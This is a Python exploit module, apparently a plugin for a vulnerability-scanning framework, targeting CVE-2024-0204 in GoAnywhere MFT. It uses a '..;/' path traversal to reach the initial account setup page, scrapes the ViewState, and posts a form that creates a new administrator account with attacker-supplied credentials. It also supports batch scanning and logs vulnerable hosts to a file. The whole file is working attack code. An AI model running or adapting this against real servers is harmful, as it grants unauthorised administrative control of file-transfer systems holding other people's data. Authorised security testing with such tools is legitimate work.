#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
class Cve_2024_0204:
    def run(self,urls,username,password):
        url = f"{urls}/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml"

        data = {
            "j_id_u:creteAdminGrid:username": username,
            "j_id_u:creteAdminGrid:password_hinput": password,
            "j_id_u:creteAdminGrid:password": "%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2",
            "j_id_u:creteAdminGrid:confirmPassword_hinput": password,
            "j_id_u:creteAdminGrid:confirmPassword": "%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2",
            "j_id_u:creteAdminGrid:submitButton": "",
            "createAdminForm_SUBMIT": 1,
        }
        try:
            s = requests.session()
            r = s.get(url, verify=self.ssl, proxies=self.proxy, headers=self.headers)
            if r.status_code == 401:
                if not self.batch:
                    raise Exception("Endpoint does not appear to be vulnerable.")

            soup = BeautifulSoup(r.text, "html.parser")
            input_field = soup.find('input', {'name': 'javax.faces.ViewState'})
            data['javax.faces.ViewState'] = input_field['value']
            r = s.post(url, verify=self.ssl, proxies=self.proxy, headers=self.headers, data=data)

            if r.status_code != 200:
                if not self.batch:
                    raise Exception("Failed to create new admin user")

            soup = BeautifulSoup(r.text, "html.parser")
            error_message = soup.find("span", {"class": "ui-messages-error-summary"})
            if error_message is not None:
                if not self.batch:
                    raise Exception(error_message.text)
            else:
                OutPrintInfoSuc("GoAnywhere", f"存在GoAnywhere MFT身份认证绕过{url}")
                if self.batch:
                    OutPutFile("goanywhere_2024_0204.txt",f"存在GoAnywhere MFT身份认证绕过{url}")
        except Exception:
            if not self.batch:
                OutPrintInfo("GoAnywhere", "目标请求出错")
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        headers = target["header"]
        proxy = target["proxy"]
        username = target["username"]
        password = target["password"]
        if len(password) < 8:
            OutPrintInfo("GoAnywhere", "密码不能少于8位")
            return
        self.headers, self.proxy = ReqSet(header=headers, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("GoAnywhere", f"开始检测GoAnywhere MFT 身份认证绕过...")
        self.run(url,username,password)
        if not self.batch:
            OutPrintInfo("GoAnywhere", f"GoAnywhere MFT 身份认证绕过检测结束")
